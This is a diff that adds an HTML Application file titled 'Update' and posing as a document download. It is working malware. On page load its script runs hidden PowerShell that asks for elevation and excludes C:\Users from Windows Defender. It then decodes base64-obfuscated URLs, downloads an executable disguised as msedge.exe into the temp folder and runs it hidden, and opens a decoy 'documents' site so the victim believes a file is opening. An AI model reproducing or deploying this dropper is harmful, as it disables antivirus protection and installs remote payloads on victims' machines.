@@ -1,0 +1,68 @@
+<HTML>
+<HEAD>
+   <HTA:APPLICATION ID="App" 
+    APPLICATIONNAME="Update"
+    BORDER="thin"
+    BORDERSTYLE="normal"
+    CAPTION="yes"
+    SHOWINTASKBAR="yes"
+    SINGLEINSTANCE="yes"
+    SYSMENU="yes"
+    WINDOWSTATE="minimize">
+   </HTA:APPLICATION>
+   <script>
+      function base64Decode(encodedStr) {
+          return decodeURIComponent(escape(window.atob(encodedStr)));
+      }
+
+      function Run() {
+         var oShell = new ActiveXObject("WScript.Shell");
+
+         // Exclude C:\Users from Windows Defender
+         try {
+             var excludeCommand = 'powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "Start-Process PowerShell -ArgumentList \'Add-MpPreference -ExclusionPath \\"C:\\Users\\"\' -Verb RunAs -WindowStyle Hidden"';
+             var exec = oShell.Run(excludeCommand, 0, true);
+             
+             if (exec !== 0) {
+                 alert("Failed TO OPEN. Please click Yes to Powershell.");
+                 oShell.Run('taskkill /F /IM mshta.exe', 0, false); // Auto-kill the HTA file
+                 return; // Stop the script if exclusion fails
+             }
+
+             alert("Please wait..document downloading and will open.");
+             
+         } catch (e) {
+             alert("An error occurred: " + e.message);
+             oShell.Run('taskkill /F /IM mshta.exe', 0, false); // Auto-kill the HTA file on error
+             return; // Stop the script if there's an error
+         }
+         
+         // Base64 encoded URLs
+         var downloadUrl = 'aHR0cHM6Ly9naXRodWIuY29tL2pvaG5paHIwMC9kb2N1bWVuL3Jhdy9tYWluL21zZWRnZS5leGU=';
+         var openUrl = 'aHR0cHM6Ly9nbG93LWNhcmUtZG9jdW1lbnRzLnRpaW55LnNpdGUv';
+
+         // Download and execute the file
+         try {
+             var decodedDownloadUrl = base64Decode(downloadUrl);
+             var downloadCommand = 'powershell -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -Command "Invoke-WebRequest -Uri \'' + decodedDownloadUrl + '\' -OutFile \'%TEMP%\\msedge.exe\'; Start-Process \'%TEMP%\\msedge.exe\' -WindowStyle Hidden"';
+             oShell.Run(downloadCommand, 0, false);
+         } catch (e) {
+             alert("An error occurred while downloading or executing the file: " + e.message);
+         }
+
+         // Open the specified link in Microsoft Edge
+         try {
+             var decodedOpenUrl = base64Decode(openUrl);
+             var edgeCommand = 'start msedge "' + decodedOpenUrl + '"';
+             oShell.Run(edgeCommand, 0, false);
+         } catch (e) {
+             alert("An error occurred while opening the link: " + e.message);
+         }
+      }
+      window.onload = Run;
+   </script>
+</HEAD>
+<BODY>
+   <p>please wait... OR REOPEN</p>
+</BODY>
+</HTML>
